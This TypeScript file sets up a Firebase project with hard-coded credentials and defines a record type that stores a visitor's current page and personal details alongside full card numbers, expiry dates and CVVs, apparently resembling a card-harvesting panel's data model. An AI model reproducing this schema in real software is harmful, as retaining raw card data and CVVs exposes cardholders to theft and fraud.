import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
    apiKey: "AIzaSyA8uJ0_9_zgJKAIEZLxo3kwHq_3LVQD_H8",
  authDomain: "test-2d692.firebaseapp.com",
  databaseURL: "https://test-2d692-default-rtdb.firebaseio.com",
  projectId: "test-2d692",
  storageBucket: "test-2d692.firebasestorage.app",
  messagingSenderId: "1054756802207",
  appId: "1:1054756802207:web:fc008ce03e759bc1bd1caa",
  measurementId: "G-RDW9YJ5MDF"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

